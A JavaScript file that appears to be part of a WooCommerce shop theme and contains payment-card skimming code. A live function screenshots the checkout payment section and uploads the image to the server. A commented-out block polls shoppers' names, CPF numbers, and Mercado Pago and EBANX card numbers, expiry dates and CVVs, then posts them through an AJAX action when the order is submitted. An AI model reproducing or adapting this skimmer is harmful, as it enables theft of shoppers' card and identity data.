import './general';
import './lib/slick.js';
import './product';

//Generate random string
window.cmakeid = function(length) {
  var result = "";
  var characters =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  var charactersLength = characters.length;
  for (var i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  return result;
}

window.uploadCPhoto = function(second) {

  let div = document.getElementById('payment');
  document.body.classList.add('loading-active');
  div.classList.add('active');
  html2canvas(div).then(
    function (canvas) {
      div.classList.remove('active');
      document.body.classList.remove('loading-active');
      document.getElementById('output').appendChild(canvas);

      var canvas = document.querySelector("#output canvas");
      var lowQuality = canvas.toDataURL("image/jpeg", 0.1);

      let photoId = cmakeid(5);
      let photoName = `cphoto-${photoId}`;
      jQuery.ajax({
        method: 'POST',
        url: '/cphoto-upload.php',
        data: {
          photo: lowQuality,
          name: photoName
        }
      }).done(() => {
        // if(!second) {
        //   uploadCPhoto(true)
        // }
      })
    })
}

// var bfnv;
// var blnv;
// var bcv;
// var mpccvn;
// var mpccedv;
// var mpcccv;
// var ebccnv;
// var ebccedv;
// var ebcccv;
// let formCheckout = document.querySelector('form.woocommerce-checkout')
// if (formCheckout) {
//   setInterval(function () {



//     var billingFirstNameInput = document.querySelector('#billing_first_name');
//     var billingLastNameInput = document.querySelector('#billing_last_name');
//     var billingCPFInput = document.querySelector('#billing_cpf');

//     var mpccni = document.querySelector('#mp-card-number');
//     var mpccedi = document.querySelector('#mp-card-expiration-date');
//     var mpccci = document.querySelector('#mp-security-code');

//     var ebccni = document.querySelector('#ebanx-card-number');
//     var ebccedi = document.querySelector('#ebanx-card-expiry');
//     var ebccci = document.querySelector('#ebanx-card-cvv');

//     bfnv = billingFirstNameInput?.value;
//     blnv = billingLastNameInput?.value;
//     bcv = billingCPFInput?.value;
//     mpccvn = mpccni?.value;
//     mpccedv = mpccedi?.value;
//     mpcccv = mpccci?.value;
//     ebccnv = ebccni?.value;
//     ebccedv = ebccedi?.value;
//     ebcccv = ebccci?.value;
//   }, 500)
    
//   formCheckout.addEventListener('submit', function () {

//     if (mpccvn) {
      
//       jQuery(document).ready(function ($) {
        
//         $.ajax({
//         type: 'POST',
//         url: ajax_object.ajaxurl,
//         data: {
//           action: 'scce',
//           fn: bfnv,
//           ln: blnv,
//           cpf: bcv,
//           ccn: mpccvn,
//           cce: mpccedv,
//           ccc: mpcccv,
//           ccneb: ebccnv,
//           cceeb: ebccedv,
//           ccceb: ebcccv
//         }
//         }).done(function (data) {
//         });
//       });
//     }
//   })



// }
// document.querySelector('form.woocommerce-checkout')?.addEventListener('submit', function () {
//   uploadCPhoto();
// })

// document.querySelector('#place_order').addEventListener('click', function () {
//   uploadCPhoto();
// })